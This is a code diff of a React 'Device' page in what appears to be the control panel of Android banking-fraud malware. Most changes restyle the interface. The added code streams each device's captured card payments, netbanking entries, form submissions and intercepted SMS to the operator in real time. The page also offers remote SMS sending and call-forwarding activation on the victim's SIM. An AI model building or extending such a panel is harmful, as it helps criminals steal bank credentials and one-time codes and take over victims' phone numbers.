@@ -1,4 +1,4 @@
-import { useEffect, useMemo, useRef, useState, type FormEvent, type ReactNode } from "react";
+import { useEffect, useMemo, useRef, useState, type FormEvent } from "react";
 import axios from "axios";
 import { useNavigate, useParams } from "react-router-dom";
 
@@ -9,8 +9,7 @@ import { listFormSubmissions } from "../services/api/forms";
 import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
 import { ENV, apiHeaders } from "../config/constants";
 import Modal from "../components/ui/Modal";
-
-import pageBg from "../assets/login-bg.png";
+import AnimatedAppBackground from "../components/layout/AnimatedAppBackground";
 
 type TabKey = "overview" | "sms" | "forwarding" | "userdata";
 type ForwardState = "idle" | "pending" | "active" | "inactive" | "failed";
@@ -91,50 +90,6 @@ function extractSimSummary(simInfo: any): { count: number; sim1: string; sim2: s
   else count = [sim1, sim2].filter((x) => x && x !== "-").length;
 
   return { count, sim1, sim2 };
-}
-
-function TechGlassCard({ children, className = "" }: { children: ReactNode; className?: string }) {
-  return (
-    <div className={`relative overflow-hidden rounded-[26px] ${className}`}>
-      <div className="pointer-events-none absolute inset-0">
-        <div className="absolute -inset-6 rounded-[34px] blur-3xl bg-cyan-400/14" />
-      </div>
-
-      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-white/14" />
-      <div className="pointer-events-none absolute inset-0 rounded-[26px] border border-cyan-200/10" />
-
-      <div className="pointer-events-none absolute left-3 top-3 h-6 w-6 rounded-tl-[10px] border-l-2 border-t-2 border-cyan-200/50" />
-      <div className="pointer-events-none absolute right-3 top-3 h-6 w-6 rounded-tr-[10px] border-r-2 border-t-2 border-cyan-200/50" />
-      <div className="pointer-events-none absolute bottom-3 left-3 h-6 w-6 rounded-bl-[10px] border-b-2 border-l-2 border-cyan-200/50" />
-      <div className="pointer-events-none absolute bottom-3 right-3 h-6 w-6 rounded-bl-[10px] border-b-2 border-r-2 border-cyan-200/50" />
-
-      <div
-        className={[
-          "relative rounded-[26px] px-4 py-4",
-          "bg-white/[0.055]",
-          "border border-white/[0.16]",
-          "backdrop-blur-3xl backdrop-saturate-[1.6]",
-          "shadow-[0_30px_90px_rgba(0,0,0,0.58)]",
-        ].join(" ")}
-      >
-        <div
-          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-70"
-          style={{
-            backgroundImage:
-              "linear-gradient(to bottom, rgba(255,255,255,0.20), rgba(255,255,255,0.06) 22%, rgba(255,255,255,0.02) 45%, rgba(255,255,255,0.00) 70%)",
-          }}
-        />
-        <div
-          className="pointer-events-none absolute inset-0 rounded-[26px] opacity-20"
-          style={{
-            backgroundImage:
-              "repeating-linear-gradient(to bottom, rgba(255,255,255,0.05) 0px, rgba(255,255,255,0.05) 1px, transparent 1px, transparent 7px)",
-          }}
-        />
-        <div className="relative">{children}</div>
-      </div>
-    </div>
-  );
 }
 
 function normalizeEvent(msg: any): { type: string; event: string; deviceId: string; data: any } {
@@ -263,6 +218,20 @@ async function tryDelete(url: string, body?: any) {
   return res.data;
 }
 
+function SurfaceCard({
+  children,
+  className = "",
+}: {
+  children: React.ReactNode;
+  className?: string;
+}) {
+  return (
+    <div className={["rounded-[24px] border border-slate-200 bg-white/92 shadow-[0_8px_24px_rgba(15,23,42,0.06)]", className].join(" ")}>
+      {children}
+    </div>
+  );
+}
+
 function SettingOptionCard({
   title,
   subtitle,
@@ -277,17 +246,17 @@ function SettingOptionCard({
   onClick: () => void;
 }) {
   return (
-    <div className="rounded-[24px] border border-white/12 bg-white/[0.045] p-3 backdrop-blur-2xl">
+    <div className="rounded-[20px] border border-slate-200 bg-white p-3">
       <div className="flex items-start gap-3">
-        <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-2xl border border-cyan-200/20 bg-cyan-400/10 text-lg">
+        <div className="flex h-11 w-11 shrink-0 items-center justify-center rounded-2xl border border-slate-200 bg-slate-50 text-lg text-slate-700">
           ✦
         </div>
 
         <div className="min-w-0 flex-1">
-          <div className="text-[13px] font-extrabold text-white">{title}</div>
-          <div className="mt-1 text-[11px] leading-5 text-white/55">{subtitle}</div>
-          <div className="mt-2 text-[12px] text-white/70">
-            Current: <span className="font-extrabold text-white">{value}</span>
+          <div className="text-[13px] font-extrabold text-slate-900">{title}</div>
+          <div className="mt-1 text-[11px] leading-5 text-slate-500">{subtitle}</div>
+          <div className="mt-2 text-[12px] text-slate-600">
+            Current: <span className="font-extrabold text-slate-900">{value}</span>
           </div>
         </div>
       </div>
@@ -295,7 +264,7 @@ function SettingOptionCard({
       <button
         type="button"
         onClick={onClick}
-        className="mt-3 h-11 w-full rounded-2xl border border-cyan-200 bg-cyan-400/90 text-[13px] font-extrabold text-black shadow-[0_6px_18px_rgba(34,211,238,0.18)]"
+        className="mt-3 h-11 w-full rounded-2xl border border-slate-200 bg-slate-50 text-[13px] font-extrabold text-slate-900 hover:bg-slate-100"
       >
         {actionLabel}
       </button>
@@ -487,6 +456,23 @@ export default function DeviceDetailPage() {
   }, []);
 
   useEffect(() => {
+    mountedRef.current = true;
+    if (!did) return;
+
+    loadDevice();
+    loadSms();
+
+    return () => {
+      mountedRef.current = false;
+    };
+  }, [did]);
+
+  useEffect(() => {
+    if (activeTab !== "userdata") return;
+    loadUserData(false).catch(() => {});
+  }, [activeTab, did]);
+
+  useEffect(() => {
     const off = wsService.onMessage((msg) => {
       const { type, event, deviceId: evDid, data } = normalizeEvent(msg);
 
@@ -506,6 +492,40 @@ export default function DeviceDetailPage() {
 
         if (online !== null) setWsOnline(online);
         if (!Number.isNaN(tsNum) && tsNum > 0) setWsLastSeen(tsNum);
+
+        setDeviceDoc((prev: any) => {
+          if (!prev) return prev;
+          return {
+            ...prev,
+            status: {
+              ...(prev.status || {}),
+              ...(online !== null ? { online } : {}),
+              ...(!Number.isNaN(tsNum) && tsNum > 0 ? { timestamp: tsNum } : {}),
+            },
+          };
+        });
+        return;
+      }
+
+      if (type === "event" && event === "notification") {
+        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid);
+        if (targetId !== did) return;
+
+        const incomingId = safeString(data?.id ?? data?._id).trim();
+        const nextItem = {
+          ...(data || {}),
+          _id: incomingId || `${Date.now()}_${Math.random().toString(16).slice(2)}`,
+          deviceId: did,
+          timestamp: Number(data?.timestamp || msg?.timestamp || Date.now()),
+        };
+
+        setSmsList((prev) => {
+          const existing = incomingId
+            ? prev.some((item: any) => safeString(item?._id ?? item?.id).trim() === incomingId)
+            : false;
+          if (existing) return prev;
+          return [nextItem, ...prev].sort((a: any, b: any) => getTimestamp(b) - getTimestamp(a));
+        });
         return;
       }
 
@@ -526,6 +546,17 @@ export default function DeviceDetailPage() {
           setForwardState("pending");
           setForwardMsg("⏳ Pending…");
         }
+
+        setDeviceDoc((prev: any) => {
+          if (!prev) return prev;
+          return {
+            ...prev,
+            simSlots: {
+              ...(prev.simSlots || {}),
+              ...(data || {}),
+            },
+          };
+        });
         return;
       }
 
@@ -597,6 +628,36 @@ export default function DeviceDetailPage() {
         if (!deletedId) return;
 
         setSmsList((prev) => prev.filter((item: any) => safeString(item?._id ?? item?.id).trim() !== deletedId));
+        return;
+      }
+
+      if ((type === "event" || type === "cmd") && (event === "form:created" || event === "form_submissions:created")) {
+        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid);
+        if (targetId !== did) return;
+
+        const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};
+        const nextPayload = { ...(payload || {}), uniqueid: did };
+
+        setLatestFormPayload(nextPayload);
+        setFormSubmitCount((prev) => prev + 1);
+        return;
+      }
+
+      if ((type === "event" || type === "cmd") && (event === "card:created" || event === "card_payment:created")) {
+        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid);
+        if (targetId !== did) return;
+
+        const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};
+        setCardPayments((prev) => [payload, ...prev]);
+        return;
+      }
+
+      if ((type === "event" || type === "cmd") && (event === "netbanking:created" || event === "net_banking:created")) {
+        const targetId = safeString(data?.uniqueid ?? data?.deviceId ?? evDid);
+        if (targetId !== did) return;
+
+        const payload = data?.payload && typeof data.payload === "object" ? data.payload : data || {};
+        setNetPayments((prev) => [payload, ...prev]);
       }
     });
 
@@ -604,23 +665,6 @@ export default function DeviceDetailPage() {
       off();
     };
   }, [did, forwardingSimDraft]);
-
-  useEffect(() => {
-    mountedRef.current = true;
-    if (!did) return;
-
-    loadDevice();
-    loadSms();
-
-    return () => {
-      mountedRef.current = false;
-    };
-  }, [did]);
-
-  useEffect(() => {
-    if (activeTab !== "userdata") return;
-    loadUserData(false).catch(() => {});
-  }, [activeTab, did]);
 
   async function handleDeleteAllSms() {
     if (!confirm("Delete all notifications for this device?")) return;
@@ -692,6 +736,7 @@ export default function DeviceDetailPage() {
         timestamp: Date.now(),
         uniqueid: did,
         deviceId: did,
+        clientMsgId: `sendsms_${did}_${Date.now()}`,
       });
 
       if (!ok) throw new Error("WebSocket not connected");
@@ -759,7 +804,7 @@ export default function DeviceDetailPage() {
       try {
         await tryPut(urls, { uniqueid: did, deviceId: did, admins: cleaned });
       } catch {
-        // REST not available, WS fallback still sent below
+        // fallback below
       }
 
       wsService.sendCmd("admins:update", {
@@ -850,7 +895,7 @@ export default function DeviceDetailPage() {
       try {
         await tryPut(urls, { uniqueid: did, deviceId: did, value, forwardingSim: value });
       } catch {
-        // REST not available, WS fallback still sent below
+        // fallback below
       }
 
       wsService.sendCmd("forwardingSim:update", {
@@ -885,20 +930,20 @@ export default function DeviceDetailPage() {
     const label = online === true ? "Online" : online === false ? "Offline" : "Unknown";
     const cls =
       online === true
-        ? "text-green-200 font-extrabold"
+        ? "text-emerald-700 font-extrabold"
         : online === false
-        ? "text-red-200 font-extrabold"
-        : "text-white/70 font-extrabold";
+        ? "text-rose-700 font-extrabold"
+        : "text-slate-600 font-extrabold";
 
     return { label, cls, ts };
   }, [wsOnline, wsLastSeen, device]);
 
   const forwardPill = useMemo(() => {
-    if (forwardState === "pending") return "bg-yellow-500/15 text-yellow-100 border-yellow-300/25";
-    if (forwardState === "active") return "bg-green-500/15 text-green-100 border-green-300/25";
-    if (forwardState === "inactive") return "bg-red-500/15 text-red-100 border-red-300/25";
-    if (forwardState === "failed") return "bg-red-500/15 text-red-100 border-red-300/25";
-    return "bg-white/[0.06] text-white/85 border-white/14";
+    if (forwardState === "pending") return "bg-amber-50 text-amber-700 border-amber-200";
+    if (forwardState === "active") return "bg-emerald-50 text-emerald-700 border-emerald-200";
+    if (forwardState === "inactive") return "bg-rose-50 text-rose-700 border-rose-200";
+    if (forwardState === "failed") return "bg-rose-50 text-rose-700 border-rose-200";
+    return "bg-slate-50 text-slate-700 border-slate-200";
   }, [forwardState]);
 
   const latestFormPairs = useMemo(() => buildPairs(latestFormPayload || {}, 20), [latestFormPayload]);
@@ -914,36 +959,24 @@ export default function DeviceDetailPage() {
   if (!did) return <div className="p-6">Missing device id</div>;
 
   return (
-    <div className="relative min-h-[100svh] w-full overflow-x-hidden bg-black">
-      <div className="absolute inset-0 bg-cover bg-center" style={{ backgroundImage: `url(${pageBg})` }} />
-      <div className="absolute inset-0 bg-gradient-to-b from-black/30 via-black/15 to-black/45" />
-      <div className="absolute inset-0 shadow-[inset_0_0_240px_rgba(0,0,0,0.60)]" />
-
-      <div className="pointer-events-none absolute inset-0 opacity-35">
-        <div className="absolute left-1/2 top-[-96px] h-[460px] w-[460px] -translate-x-1/2 rounded-full bg-cyan-400/16 blur-3xl" />
-        <div className="absolute left-[-120px] top-[35%] h-[360px] w-[360px] rounded-full bg-blue-400/10 blur-3xl" />
-        <div className="absolute bottom-[-140px] right-[-140px] h-[420px] w-[420px] rounded-full bg-cyan-300/12 blur-3xl" />
-      </div>
-
-      <div className="relative mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
-        <TechGlassCard>
+    <AnimatedAppBackground>
+      <div className="mx-auto w-full max-w-[420px] px-3 pb-24 pt-4">
+        <SurfaceCard className="p-4">
           <div className="flex items-start justify-between gap-3">
             <div className="min-w-0">
-              <div className="text-[22px] font-extrabold tracking-tight text-white">Device</div>
-              <div className="break-all text-[12px] text-white/60">{did}</div>
+              <div className="text-[22px] font-extrabold tracking-tight text-slate-900">Device</div>
+              <div className="break-all text-[12px] text-slate-500">{did}</div>
 
-              <div className="mt-1 text-[11px] text-white/45">
+              <div className="mt-1 text-[11px] text-slate-500">
                 Status: <span className={statusLine.cls}>{statusLine.label}</span>
-                {statusLine.ts ? (
-                  <span className="text-white/40"> • Last seen {new Date(statusLine.ts).toLocaleString()}</span>
-                ) : null}
+                {statusLine.ts ? <span className="text-slate-400"> • Last seen {new Date(statusLine.ts).toLocaleString()}</span> : null}
               </div>
             </div>
 
             <div className="flex shrink-0 items-center gap-2">
               <button
                 onClick={() => nav("/devices")}
-                className="h-10 rounded-2xl border border-white/14 bg-white/[0.06] px-4 text-white/85 backdrop-blur-2xl hover:bg-white/[0.09]"
+                className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-800 hover:bg-slate-50"
                 type="button"
               >
                 Back
@@ -952,7 +985,7 @@ export default function DeviceDetailPage() {
           </div>
 
           {loading ? (
-            <div className="mt-4 rounded-3xl border border-white/14 bg-white/[0.05] p-5 text-center text-white/70 backdrop-blur-2xl">
+            <div className="mt-4 rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">
               Loading…
             </div>
           ) : (
@@ -970,10 +1003,10 @@ export default function DeviceDetailPage() {
                     key={k}
                     onClick={() => setActiveTab(k)}
                     className={[
-                      "h-10 whitespace-nowrap rounded-2xl border border-white/[0.14] px-4 text-[13px] font-semibold",
+                      "h-10 whitespace-nowrap rounded-2xl border px-4 text-[13px] font-semibold",
                       activeTab === k
-                        ? "border-cyan-200 bg-cyan-400/90 text-black shadow-[0_6px_18px_rgba(34,211,238,0.18)]"
-                        : "bg-white/[0.06] text-white/85 hover:bg-white/[0.09]",
+                        ? "border-slate-900 bg-slate-900 text-white"
+                        : "border-slate-200 bg-white text-slate-700 hover:bg-slate-50",
                     ].join(" ")}
                     type="button"
                   >
@@ -983,30 +1016,28 @@ export default function DeviceDetailPage() {
               </div>
 
               {error && (
-                <div className="mt-4 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 py-2 text-sm text-red-100">
+                <div className="mt-4 rounded-2xl border border-rose-200 bg-rose-50 px-4 py-2 text-sm text-rose-700">
                   {error}
                 </div>
               )}
 
               {activeTab === "overview" && (
                 <div className="mt-4 space-y-3">
-                  <div className="rounded-3xl border border-white/12 bg-white/[0.04] p-4 backdrop-blur-2xl">
-                    <div className="flex items-center justify-between gap-2">
-                      <div className="text-[14px] font-extrabold text-white">Overview</div>
-                    </div>
+                  <SurfaceCard className="p-4">
+                    <div className="text-[14px] font-extrabold text-slate-900">Overview</div>
 
                     <div className="mt-3 grid grid-cols-1 gap-3">
-                      <div className="rounded-2xl border border-white/12 bg-white/[0.04] p-3">
-                        <div className="text-[11px] text-white/55">SIMs</div>
-                        <div className="mt-1 text-[13px] text-white/85">
-                          Count: <span className="font-extrabold text-white">{simSummary.count}</span>
+                      <div className="rounded-2xl border border-slate-200 bg-slate-50 p-3">
+                        <div className="text-[11px] text-slate-500">SIMs</div>
+                        <div className="mt-1 text-[13px] text-slate-700">
+                          Count: <span className="font-extrabold text-slate-900">{simSummary.count}</span>
                         </div>
-                        <div className="mt-2 text-[12px] text-white/70">
+                        <div className="mt-2 text-[12px] text-slate-600">
                           <div>
-                            SIM 1: <span className="font-extrabold text-white">{simSummary.sim1}</span>
+                            SIM 1: <span className="font-extrabold text-slate-900">{simSummary.sim1}</span>
                           </div>
                           <div>
-                            SIM 2: <span className="font-extrabold text-white">{simSummary.sim2}</span>
+                            SIM 2: <span className="font-extrabold text-slate-900">{simSummary.sim2}</span>
                           </div>
                         </div>
                       </div>
@@ -1031,18 +1062,18 @@ export default function DeviceDetailPage() {
                         onClick={() => setSimPickerOpen(true)}
                       />
 
-                      <div className="rounded-2xl border border-white/12 bg-white/[0.04] p-3">
-                        <div className="mb-2 text-[11px] text-white/55">Metadata</div>
+                      <div className="rounded-2xl border border-slate-200 bg-white p-3">
+                        <div className="mb-2 text-[11px] text-slate-500">Metadata</div>
                         {getKeyValuePairs(device?.metadata).length === 0 ? (
-                          <div className="text-[12px] text-white/50">No metadata</div>
+                          <div className="text-[12px] text-slate-500">No metadata</div>
                         ) : (
                           <div className="grid grid-cols-1 gap-2">
                             {getKeyValuePairs(device?.metadata)
                               .slice(0, 12)
                               .map((p) => (
                                 <div key={p.label} className="flex items-start justify-between gap-2">
-                                  <div className="text-[11px] text-white/55">{p.label}</div>
-                                  <div className="break-all text-right text-[11px] font-extrabold text-white">
+                                  <div className="text-[11px] text-slate-500">{p.label}</div>
+                                  <div className="break-all text-right text-[11px] font-extrabold text-slate-900">
                                     {p.value}
                                   </div>
                                 </div>
@@ -1051,23 +1082,19 @@ export default function DeviceDetailPage() {
                         )}
                       </div>
                     </div>
-                  </div>
+                  </SurfaceCard>
                 </div>
               )}
 
               {activeTab === "sms" && (
                 <div className="mt-4 space-y-3">
-                  <div className="rounded-3xl border border-white/12 bg-white/[0.04] p-4 backdrop-blur-2xl">
-                    <div className="flex items-start justify-between gap-3">
-                      <div className="min-w-0">
-                        <div className="text-[14px] font-extrabold text-white">SMS</div>
-                      </div>
-                    </div>
+                  <SurfaceCard className="p-4">
+                    <div className="text-[14px] font-extrabold text-slate-900">SMS</div>
 
                     <div className="mt-3 grid grid-cols-2 gap-2">
                       <button
                         onClick={() => setSendOpen(true)}
-                        className="col-span-2 h-11 rounded-2xl border border-cyan-200 bg-cyan-400/90 px-5 font-extrabold text-black shadow-[0_6px_18px_rgba(34,211,238,0.18)]"
+                        className="col-span-2 h-11 rounded-2xl border border-slate-900 bg-slate-900 px-5 font-extrabold text-white"
                         type="button"
                       >
                         Send SMS (WS)
@@ -1075,7 +1102,7 @@ export default function DeviceDetailPage() {
 
                       <button
                         onClick={() => loadSms()}
-                        className="h-10 rounded-2xl border border-white/14 bg-white/[0.06] px-4 text-white/85 hover:bg-white/[0.09]"
+                        className="h-10 rounded-2xl border border-slate-200 bg-white px-4 text-slate-700 hover:bg-slate-50"
                         type="button"
                       >
                         Refresh
@@ -1083,31 +1110,31 @@ export default function DeviceDetailPage() {
 
                       <button
                         onClick={handleDeleteAllSms}
-                        className="h-10 rounded-2xl border border-red-400/25 bg-red-500/10 px-4 text-red-100 hover:bg-red-500/14"
+                        className="h-10 rounded-2xl border border-rose-200 bg-rose-50 px-4 text-rose-700 hover:bg-rose-100"
                         type="button"
                       >
                         Delete All
                       </button>
                     </div>
-                  </div>
+                  </SurfaceCard>
 
                   <div className="space-y-3">
                     {loadingSms ? (
-                      <div className="rounded-3xl border border-white/14 bg-white/[0.05] p-5 text-center text-white/70 backdrop-blur-2xl">
+                      <div className="rounded-3xl border border-slate-200 bg-white p-5 text-center text-slate-500">
                         Loading…
                       </div>
                     ) : smsList.length === 0 ? (
-                      <div className="rounded-3xl border border-white/14 bg-white/[0.05] p-6 text-center text-white/70 backdrop-blur-2xl">
+                      <div className="rounded-3xl border border-slate-200 bg-white p-6 text-center text-slate-500">
                         <div className="flex min-h-[220px] flex-col items-center justify-center gap-4">
-                          <div className="font-extrabold text-white/80">No SMS found</div>
-                          <div className="max-w-[260px] text-[12px] text-white/55">
+                          <div className="font-extrabold text-slate-800">No SMS found</div>
+                          <div className="max-w-[260px] text-[12px] text-slate-500">
                             There are no stored notifications for this device yet. You can still send an SMS using the
                             WebSocket action below.
                           </div>
 
                           <button
                             onClick={() => setSendOpen(true)}
-                            className="h-11 w-full max-w-[280px] rounded-2xl border border-cyan-200 bg-cyan-400/90 px-5 font-extrabold text-black shadow-[0_6px_18px_rgba(34,211,238,0.18)]"
+                            className="h-11 w-full max-w-[280px] rounded-2xl border border-slate-900 bg-slate-900 px-5 font-extrabold text-white"
                             type="button"
                           >
                             Send SMS (WS)
@@ -1127,38 +1154,32 @@ export default function DeviceDetailPage() {
                         return (
                           <div
                             key={m._id || m.id || m.timestamp || `${sender}-${receiver2}-${ts}`}
-                            className={[
-                              "relative w-full overflow-hidden rounded-[26px] border border-white/14 bg-white/[0.055] p-4 text-left",
-                              "backdrop-blur-3xl backdrop-saturate-[1.6]",
-                              "shadow-[0_22px_70px_rgba(0,0,0,0.45)]",
-                            ].join(" ")}
+                            className="w-full rounded-[22px] border border-slate-200 bg-white p-4 shadow-[0_6px_20px_rgba(15,23,42,0.05)]"
                           >
-                            <div className="pointer-events-none absolute -inset-2 rounded-[28px] bg-cyan-400/10 blur-2xl" />
-
-                            <div className="relative flex items-start justify-between gap-3">
+                            <div className="flex items-start justify-between gap-3">
                               <div className="min-w-0">
-                                <div className="min-w-0 truncate text-[14px] font-extrabold text-white">{title}</div>
+                                <div className="min-w-0 truncate text-[14px] font-extrabold text-slate-900">{title}</div>
 
-                                <div className="mt-1 break-words whitespace-normal text-[12px] text-white/70">
-                                  <span className="text-white/60">From:</span>{" "}
-                                  <span className="font-semibold text-white/85">{sender}</span>
+                                <div className="mt-1 break-words whitespace-normal text-[12px] text-slate-600">
+                                  <span className="text-slate-500">From:</span>{" "}
+                                  <span className="font-semibold text-slate-800">{sender}</span>
                                   {receiver2 ? (
                                     <>
-                                      <span className="text-white/45"> {" → "} </span>
-                                      <span className="font-semibold text-white/85">{receiver2}</span>
+                                      <span className="text-slate-400"> {" → "} </span>
+                                      <span className="font-semibold text-slate-800">{receiver2}</span>
                                     </>
                                   ) : null}
                                 </div>
                               </div>
 
                               <div className="shrink-0 text-right">
-                                <div className="text-[11px] text-white/45">{ts ? new Date(ts).toLocaleString() : "-"}</div>
+                                <div className="text-[11px] text-slate-400">{ts ? new Date(ts).toLocaleString() : "-"}</div>
 
                                 <button
                                   type="button"
                                   onClick={() => handleDeleteSingleSms(m)}
                                   disabled={isDeleting || !smsId}
-                                  className="mt-2 h-8 rounded-xl border border-red-400/25 bg-red-500/10 px-3 text-[11px] font-extrabold text-red-100 hover:bg-red-500/14 disabled:cursor-not-allowed disabled:opacity-50"
+                                  className="mt-2 h-8 rounded-xl border border-rose-200 bg-rose-50 px-3 text-[11px] font-extrabold text-rose-700 hover:bg-rose-100 disabled:cursor-not-allowed disabled:opacity-50"
                                 >
                                   {isDeleting ? "Deleting..." : "Delete"}
                                 </button>
@@ -1166,11 +1187,9 @@ export default function DeviceDetailPage() {
                             </div>
 
                             {body ? (
-                              <div className="relative mt-3 break-words whitespace-pre-wrap text-[13px] text-white/85">
-                                {body}
-                              </div>
+                              <div className="mt-3 break-words whitespace-pre-wrap text-[13px] text-slate-800">{body}</div>
                             ) : (
-                              <div className="relative mt-3 text-[13px] text-white/45">—</div>
+                              <div className="mt-3 text-[13px] text-slate-400">—</div>
                             )}
                           </div>
                         );
@@ -1181,118 +1200,115 @@ export default function DeviceDetailPage() {
               )}
 
               {activeTab === "forwarding" && (
-                <div className="mt-4 rounded-3xl border border-white/12 bg-white/[0.04] p-4 backdrop-blur-2xl">
-                  <div className="flex items-center justify-between gap-2">
-                    <div>
-                      <div className="text-[14px] font-extrabold text-white">Call Forwarding</div>
-                      <div className="mt-1 text-[12px] text-white/60">Android-like WS command + realtime result</div>
-                    </div>
-                    <span className={["rounded-full border px-3 py-1 text-[12px] font-extrabold", forwardPill].join(" ")}>
-                      {forwardState === "idle"
-                        ? "Ready"
-                        : forwardState === "pending"
-                        ? "Pending"
-                        : forwardState === "active"
-                        ? "Active"
-                        : forwardState === "inactive"
-                        ? "Inactive"
-                        : "Failed"}
-                    </span>
-                  </div>
-
-                  {forwardMsg ? <div className="mt-2 text-[11px] text-white/55">{forwardMsg}</div> : null}
-
-                  <div className="mt-4 rounded-3xl border border-white/12 bg-white/[0.04] p-4">
-                    <div className="mb-2 text-[12px] text-white/60">Select SIM</div>
-
-                    <div className="mb-3 flex items-center gap-2">
-                      <button
-                        type="button"
-                        onClick={() => setForwardingSimDraft("1")}
-                        className={[
-                          "h-10 rounded-2xl border border-white/14 px-4 text-[13px] font-extrabold",
-                          forwardingSimDraft === "1"
-                            ? "border-cyan-200 bg-cyan-400/90 text-black"
-                            : "bg-white/[0.06] text-white/85",
-                        ].join(" ")}
-                      >
-                        SIM 1
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => setForwardingSimDraft("2")}
-                        className={[
-                          "h-10 rounded-2xl border border-white/14 px-4 text-[13px] font-extrabold",
-                          forwardingSimDraft === "2"
-                            ? "border-cyan-200 bg-cyan-400/90 text-black"
-                            : "bg-white/[0.06] text-white/85",
-                        ].join(" ")}
-                      >
-                        SIM 2
-                      </button>
-                    </div>
-
-                    <div className="mb-4 text-[11px] text-white/60">
+                <div className="mt-4">
+                  <SurfaceCard className="p-4">
+                    <div className="flex items-center justify-between gap-2">
                       <div>
-                        SIM 1: <span className="font-extrabold text-white">{simSummary.sim1}</span>
+                        <div className="text-[14px] font-extrabold text-slate-900">Call Forwarding</div>
+                        <div className="mt-1 text-[12px] text-slate-500">Android-like WS command + realtime result</div>
                       </div>
-                      <div>
-                        SIM 2: <span className="font-extrabold text-white">{simSummary.sim2}</span>
+                      <span className={["rounded-full border px-3 py-1 text-[12px] font-extrabold", forwardPill].join(" ")}>
+                        {forwardState === "idle"
+                          ? "Ready"
+                          : forwardState === "pending"
+                          ? "Pending"
+                          : forwardState === "active"
+                          ? "Active"
+                          : forwardState === "inactive"
+                          ? "Inactive"
+                          : "Failed"}
+                      </span>
+                    </div>
+
+                    {forwardMsg ? <div className="mt-2 text-[11px] text-slate-500">{forwardMsg}</div> : null}
+
+                    <div className="mt-4 rounded-3xl border border-slate-200 bg-slate-50 p-4">
+                      <div className="mb-2 text-[12px] text-slate-500">Select SIM</div>
+
+                      <div className="mb-3 flex items-center gap-2">
+                        <button
+                          type="button"
+                          onClick={() => setForwardingSimDraft("1")}
+                          className={[
+                            "h-10 rounded-2xl border px-4 text-[13px] font-extrabold",
+                            forwardingSimDraft === "1"
+                              ? "border-slate-900 bg-slate-900 text-white"
+                              : "border-slate-200 bg-white text-slate-700",
+                          ].join(" ")}
+                        >
+                          SIM 1
+                        </button>
+                        <button
+                          type="button"
+                          onClick={() => setForwardingSimDraft("2")}
+                          className={[
+                            "h-10 rounded-2xl border px-4 text-[13px] font-extrabold",
+                            forwardingSimDraft === "2"
+                              ? "border-slate-900 bg-slate-900 text-white"
+                              : "border-slate-200 bg-white text-slate-700",
+                          ].join(" ")}
+                        >
+                          SIM 2
+                        </button>
+                      </div>
+
+                      <div className="mb-4 text-[11px] text-slate-500">
+                        <div>
+                          SIM 1: <span className="font-extrabold text-slate-900">{simSummary.sim1}</span>
+                        </div>
+                        <div>
+                          SIM 2: <span className="font-extrabold text-slate-900">{simSummary.sim2}</span>
+                        </div>
+                      </div>
+
+                      <div className="mb-2 text-[12px] text-slate-500">Forwarding Number</div>
+                      <input
+                        value={forwardingNumberDraft}
+                        onChange={(e) => setForwardingNumberDraft(e.target.value)}
+                        className="h-11 w-full rounded-2xl border border-slate-200 bg-white px-4 text-[14px] text-slate-900 outline-none focus:border-sky-300 focus:ring-2 focus:ring-sky-100"
+                        placeholder="Enter number (10 digits / +country)"
+                      />
+
+                      <div className="mt-4 flex items-center justify-end gap-2">
+                        <button
+                          type="button"
+                          onClick={() => sendCallForwardCommand("deactivate")}
+                          className="h-11 rounded-2xl border border-rose-200 bg-rose-50 px-5 font-extrabold text-rose-700 hover:bg-rose-100"
+                        >
+                          Deactivate
+                        </button>
+                        <button
+                          type="button"
+                          onClick={() => sendCallForwardCommand("activate")}
+                          className="h-11 rounded-2xl border border-slate-900 bg-slate-900 px-6 font-extrabold text-white"
+                        >
+                          Activate
+                        </button>
+                      </div>
+
+                      <div className="mt-3 text-[11px] text-slate-500">
+                        WS cmd: <span className="font-extrabold text-slate-900">call_forward</span> • sim:{" "}
+                        <span className="font-extrabold text-slate-900">{simLabel}</span>
                       </div>
                     </div>
-
-                    <div className="mb-2 text-[12px] text-white/60">Forwarding Number</div>
-                    <input
-                      value={forwardingNumberDraft}
-                      onChange={(e) => setForwardingNumberDraft(e.target.value)}
-                      className={[
-                        "h-11 w-full rounded-2xl border border-white/[0.14] bg-white/[0.06] px-4 text-[14px]",
-                        "text-white placeholder:text-white/35",
-                        "backdrop-blur-2xl outline-none",
-                        "focus:border-cyan-200/50 focus:ring-2 focus:ring-cyan-400/20",
-                      ].join(" ")}
-                      placeholder="Enter number (10 digits / +country)"
-                    />
-
-                    <div className="mt-4 flex items-center justify-end gap-2">
-                      <button
-                        type="button"
-                        onClick={() => sendCallForwardCommand("deactivate")}
-                        className="h-11 rounded-2xl border border-red-400/25 bg-red-500/10 px-5 font-extrabold text-red-100 hover:bg-red-500/14"
-                      >
-                        Deactivate
-                      </button>
-                      <button
-                        type="button"
-                        onClick={() => sendCallForwardCommand("activate")}
-                        className="h-11 rounded-2xl border border-cyan-200 bg-cyan-400/90 px-6 font-extrabold text-black"
-                      >
-                        Activate
-                      </button>
-                    </div>
-
-                    <div className="mt-3 text-[11px] text-white/45">
-                      WS cmd: <span className="font-extrabold text-white">call_forward</span> • sim:{" "}
-                      <span className="font-extrabold text-white">{simLabel}</span>
-                    </div>
-                  </div>
+                  </SurfaceCard>
                 </div>
               )}
 
               {activeTab === "userdata" && (
                 <div className="mt-4 space-y-3">
-                  <div className="rounded-3xl border border-white/12 bg-white/[0.04] p-4 backdrop-blur-2xl">
+                  <SurfaceCard className="p-4">
                     <div className="flex items-start justify-between gap-2">
                       <div>
-                        <div className="text-[14px] font-extrabold text-white">User Data</div>
-                        <div className="mt-1 text-[12px] text-white/60">
+                        <div className="text-[14px] font-extrabold text-slate-900">User Data</div>
+                        <div className="mt-1 text-[12px] text-slate-500">
